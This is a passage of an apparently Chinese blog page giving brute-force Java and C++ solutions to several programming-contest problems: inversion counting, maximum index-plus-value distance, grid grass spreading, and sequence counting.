<span class="number">0</span>;</span><br><span class="line"><span class="built_in">cin</span> &gt;&gt; n;</span><br><span class="line"><span class="keyword">int</span> a[n];</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line"><span class="built_in">cin</span> &gt;&gt; a[i];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> ans = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> j = i + <span class="number">1</span>; j &lt; n; j++) &#123;</span><br><span class="line"><span class="keyword">bool</span> flag = <span class="literal">false</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> k = j + <span class="number">1</span>; k &lt; n; k++) &#123;</span><br><span class="line"><span class="keyword">if</span> (a[i] &lt; a[j] &amp;&amp; a[j] &lt; a[k]) &#123;</span><br><span class="line">ans++;</span><br><span class="line">flag = <span class="literal">true</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (flag)&#123;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; ans &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h2 id="题目6"><a href="#题目6" class="headerlink" title="题目6"></a>题目6</h2><blockquote><p>问题描述<br>　　在数列 a_1, a_2, …, a_n中，如果 a_i 和 a_j 满足 i &lt; j 且 a_i &gt; a_j，则称为一个逆序数对。<br>　　给定一个数列，请问数列中总共有多少个逆序数对。<br>    输入格式<br>    　　输入的第一行包含一个整数 n。<br>    　　第二行包含 n 个整数 a_1, a_2, …, a_n，相邻的整数间用空格分隔，表示给定的数列。<br>    输出格式<br>    　　输出一行包含一个整数，表示答案。<br>    样例输入<br>    6<br>    3 1 5 2 3 5<br>    样例输出<br>    4</p></blockquote><p>思路：暴力计数<br>解题代码：</p><ul><li><p>java:</p>  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> wiki.zimo.exam2019;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* </span></span><br><span class="line"><span class="comment">* <span class="doctag">@author</span> zimo</span></span><br><span class="line"><span class="comment">*</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Demo06</span> </span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">Scanner input = <span class="keyword">new</span> Scanner(System.in);</span><br><span class="line"><span class="keyword">int</span> n = input.nextInt();</span><br><span class="line"><span class="keyword">int</span> a[] = <span class="keyword">new</span> <span class="keyword">int</span>[n];</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; n;i++) &#123;</span><br><span class="line">a[i] = input.nextInt();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> ans = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; n;i++) &#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> j = i + <span class="number">1</span>;j &lt; n;j++) &#123;</span><br><span class="line"><span class="keyword">if</span> (a[i] &gt; a[j]) &#123;</span><br><span class="line">ans++;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">System.out.println(ans);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>c++:</p>  <figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">int</span> n = <span class="number">0</span>;</span><br><span class="line"><span class="built_in">cin</span> &gt;&gt; n;</span><br><span class="line"><span class="keyword">int</span> a[n];</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line"><span class="built_in">cin</span> &gt;&gt; a[i];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> ans = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> j = i + <span class="number">1</span>; j &lt; n; j++) &#123;</span><br><span class="line"><span class="keyword">if</span> (a[i] &gt; a[j]) &#123;</span><br><span class="line">ans++;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; ans &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h2 id="题目7"><a href="#题目7" class="headerlink" title="题目7"></a>题目7</h2><blockquote><p>问题描述<br>　　在数列 a_1, a_2, …, a_n中，定义两个元素 a_i 和 a_j 的距离为 |i-j|+|a_i-a_j|，即元素下标的距离加上元素值的差的绝对值，其中 |x| 表示 x 的绝对值。<br>　　给定一个数列，请问找出元素之间最大的元素距离。<br>    输入格式<br>    　　输入的第一行包含一个整数 n。<br>    　　第二行包含 n 个整数 a_1, a_2, …, a_n，相邻的整数间用空格分隔，表示给定的数列。<br>    输出格式<br>    　　输出一行包含一个整数，表示答案。<br>    样例输入<br>    5<br>    9 4 2 4 7<br>    样例输出<br>    9<br>    样例说明<br>    　　a_1 和 a_3 的距离为 |1-3|+|9-2|=9。</p></blockquote><p>思路：暴力<br>解题代码：</p><ul><li><p>java:</p>  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> wiki.zimo.exam2019;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* </span></span><br><span class="line"><span class="comment">* <span class="doctag">@author</span> zimo</span></span><br><span class="line"><span class="comment">*</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Demo07</span> </span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">Scanner input = <span class="keyword">new</span> Scanner(System.in);</span><br><span class="line"><span class="keyword">int</span> n = input.nextInt();</span><br><span class="line"><span class="keyword">int</span> a[] = <span class="keyword">new</span> <span class="keyword">int</span>[n];</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; n;i++) &#123;</span><br><span class="line">a[i] = input.nextInt();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> ans = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; n;i++) &#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> j = i + <span class="number">1</span>;j &lt; n;j++) &#123;</span><br><span class="line"><span class="keyword">int</span> dis = Math.abs(i - j) + Math.abs(a[i] - a[j]);</span><br><span class="line">ans = Math.max(dis, ans);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">System.out.println(ans);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>c++:</p>  <figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cmath&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">int</span> n = <span class="number">0</span>;</span><br><span class="line"><span class="built_in">cin</span> &gt;&gt; n;</span><br><span class="line"><span class="keyword">int</span> a[n];</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line"><span class="built_in">cin</span> &gt;&gt; a[i];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> ans = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> j = i + <span class="number">1</span>; j &lt; n; j++) &#123;</span><br><span class="line"><span class="keyword">int</span> dis = <span class="built_in">abs</span>(i - j) + <span class="built_in">abs</span>(a[i] - a[j]);</span><br><span class="line">ans = max(dis, ans);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; ans &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h2 id="题目8"><a href="#题目8" class="headerlink" title="题目8"></a>题目8</h2><blockquote><p>问题描述<br>　　小明有一块空地，他将这块空地划分为 n 行 m 列的小块，每行和每列的长度都为 1。<br>　　小明选了其中的一些小块空地，种上了草，其他小块仍然保持是空地。<br>　　这些草长得很快，每个月，草都会向外长出一些，如果一个小块种了草，则它将向自己的上、下、左、右四小块空地扩展，这四小块空地都将变为有草的小块。<br>　　请告诉小明，k 个月后空地上哪些地方有草。<br>    输入格式<br>    　　输入的第一行包含两个整数 n, m。<br>    　　接下来 n 行，每行包含 m 个字母，表示初始的空地状态，字母之间没有空格。如果为小数点，表示为空地，如果字母为 g，表示种了草。<br>    　　接下来包含一个整数 k。<br>    输出格式<br>    　　输出 n 行，每行包含 m 个字母，表示 k 个月后空地的状态。如果为小数点，表示为空地，如果字母为 g，表示长了草。<br>    样例输入<br>    4 5<br>    .g…<br>    …..<br>    ..g..<br>    …..<br>    2<br>    样例输出<br>    gggg.<br>    gggg.<br>    ggggg<br>    .ggg.</p></blockquote><p>思路：按时刻更新空地即可<br>解题代码：</p><ul><li><p>java:</p>  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> wiki.zimo.exam2019;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* </span></span><br><span class="line"><span class="comment">* <span class="doctag">@author</span> zimo</span></span><br><span class="line"><span class="comment">*</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Demo08</span> </span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">Scanner input = <span class="keyword">new</span> Scanner(System.in);</span><br><span class="line"><span class="keyword">int</span> n = input.nextInt();</span><br><span class="line"><span class="keyword">int</span> m = input.nextInt();</span><br><span class="line"><span class="comment">// 干掉回车符</span></span><br><span class="line">input.nextLine();</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> map[][] = <span class="keyword">new</span> <span class="keyword">char</span>[n][m];</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; n;i++) &#123;</span><br><span class="line">map[i] = input.nextLine().toCharArray();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> k = input.nextInt();</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; k;i++) &#123;</span><br><span class="line">List&lt;Integer&gt; xs = <span class="keyword">new</span> ArrayList&lt;Integer&gt;();</span><br><span class="line">List&lt;Integer&gt; ys = <span class="keyword">new</span> ArrayList&lt;Integer&gt;();</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> x = <span class="number">0</span>;x &lt; n;x++) &#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> y = <span class="number">0</span>;y &lt; m;y++) &#123;</span><br><span class="line"><span class="keyword">if</span> (map[x][y] == <span class="string">'g'</span>) &#123;</span><br><span class="line">xs.add(x);</span><br><span class="line">ys.add(y);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>;j &lt; xs.size();j++) &#123;</span><br><span class="line">dfs(map, xs.get(j), ys.get(j));</span><br><span class="line">&#125;</span><br><span class="line">xs.clear();</span><br><span class="line">ys.clear();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">print(map, n, m);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">print</span><span class="params">(<span class="keyword">char</span> map[][],<span class="keyword">int</span> n,<span class="keyword">int</span> m)</span> </span>&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; n;i++) &#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>;j &lt; m;j++) &#123;</span><br><span class="line">System.out.print(map[i][j]);</span><br><span class="line">&#125;</span><br><span class="line">System.out.println();</span><br><span class="line">&#125;</span><br><span class="line">System.out.println();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">dfs</span><span class="params">(<span class="keyword">char</span>[][] map,<span class="keyword">int</span> x,<span class="keyword">int</span> y)</span> </span>&#123;</span><br><span class="line"><span class="keyword">if</span> (x - <span class="number">1</span> &gt;= <span class="number">0</span> &amp;&amp; map[x - <span class="number">1</span>][y] == <span class="string">'.'</span>) &#123;</span><br><span class="line">map[x - <span class="number">1</span>][y] = <span class="string">'g'</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (x + <span class="number">1</span> &lt; map.length &amp;&amp; map[x + <span class="number">1</span>][y] == <span class="string">'.'</span>) &#123;</span><br><span class="line">map[x + <span class="number">1</span>][y] = <span class="string">'g'</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (y - <span class="number">1</span> &gt;= <span class="number">0</span> &amp;&amp; map[x][y - <span class="number">1</span>] == <span class="string">'.'</span>) &#123;</span><br><span class="line">map[x][y - <span class="number">1</span>] = <span class="string">'g'</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (y + <span class="number">1</span> &lt; map[x].length &amp;&amp; map[x][y + <span class="number">1</span>] == <span class="string">'.'</span>) &#123;</span><br><span class="line">map[x][y + <span class="number">1</span>] = <span class="string">'g'</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>c++:</p>  <figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> N 100</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> M 100</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> n = <span class="number">0</span>, m = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dfs</span><span class="params">(<span class="keyword">char</span> <span class="built_in">map</span>[N][M], <span class="keyword">int</span> x, <span class="keyword">int</span> y)</span> </span>&#123;</span><br><span class="line"><span class="keyword">if</span> (x - <span class="number">1</span> &gt;= <span class="number">0</span> &amp;&amp; <span class="built_in">map</span>[x - <span class="number">1</span>][y] == <span class="string">'.'</span>) &#123;</span><br><span class="line"><span class="built_in">map</span>[x - <span class="number">1</span>][y] = <span class="string">'g'</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (x + <span class="number">1</span> &lt; n &amp;&amp; <span class="built_in">map</span>[x + <span class="number">1</span>][y] == <span class="string">'.'</span>) &#123;</span><br><span class="line"><span class="built_in">map</span>[x + <span class="number">1</span>][y] = <span class="string">'g'</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (y - <span class="number">1</span> &gt;= <span class="number">0</span> &amp;&amp; <span class="built_in">map</span>[x][y - <span class="number">1</span>] == <span class="string">'.'</span>) &#123;</span><br><span class="line"><span class="built_in">map</span>[x][y - <span class="number">1</span>] = <span class="string">'g'</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (y + <span class="number">1</span> &lt; m &amp;&amp; <span class="built_in">map</span>[x][y + <span class="number">1</span>] == <span class="string">'.'</span>) &#123;</span><br><span class="line"><span class="built_in">map</span>[x][y + <span class="number">1</span>] = <span class="string">'g'</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print</span><span class="params">(<span class="keyword">char</span> <span class="built_in">map</span>[N][M])</span> </span>&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; m; j++) &#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="built_in">map</span>[i][j];</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">int</span> k = <span class="number">0</span>;</span><br><span class="line"><span class="built_in">cin</span> &gt;&gt; n &gt;&gt; m;</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> <span class="built_in">map</span>[N][M];</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; m; j++) &#123;</span><br><span class="line"><span class="built_in">cin</span> &gt;&gt; <span class="built_in">map</span>[i][j];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">cin</span> &gt;&gt; k;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; k; i++) &#123;</span><br><span class="line"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; xs;</span><br><span class="line"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; ys;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> x = <span class="number">0</span>; x &lt; n; x++) &#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> y = <span class="number">0</span>; y &lt; m; y++) &#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">map</span>[x][y] == <span class="string">'g'</span>) &#123;</span><br><span class="line">xs.push_back(x);</span><br><span class="line">ys.push_back(y);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; xs.size(); j++) &#123;</span><br><span class="line">dfs(<span class="built_in">map</span>, xs[j], ys[j]);</span><br><span class="line">&#125;</span><br><span class="line">xs.clear();</span><br><span class="line">ys.clear();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">print(<span class="built_in">map</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h2 id="题目9"><a href="#题目9" class="headerlink" title="题目9"></a>题目9</h2><blockquote><p>问题描述<br> 　　小明想知道，满足以下条件的正整数序列的数量：<br> 　　1. 第一项为 n；<br> 　　2. 第二项不超过 n；<br> 　　3. 从第三项开始，每一项小于前两项的差的绝对值。<br> 　　请计算，对于给定的 n，有多少种满足条件的序列。<br>    输入格式<br>    　　输入一行包含一个整数 n。<br>    输出格式<br>    　　输出一个整数，表示答案。答案可能很大，请输出答案除以10000的余数。<br>    样例输入<br>    4<br>    样例输出<br>    7<br>    样例说明<br>    　　以下是满足条件的序列：<br>    　　4 1<br>    　　4 1 1<br>    　　4 1 2<br>    　　4 2<br>    　　4 2 1<br>    　　4 3<br>    　　4 4</p></blockquote><p>思路：改版的斐波那契数列，经典的递归回溯问题，动态规划问题（博主能力有限，动态规划解法没做出来，回溯法可以得部分分）<br>解题代码：</p><ul><li><p>java:</p>  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span 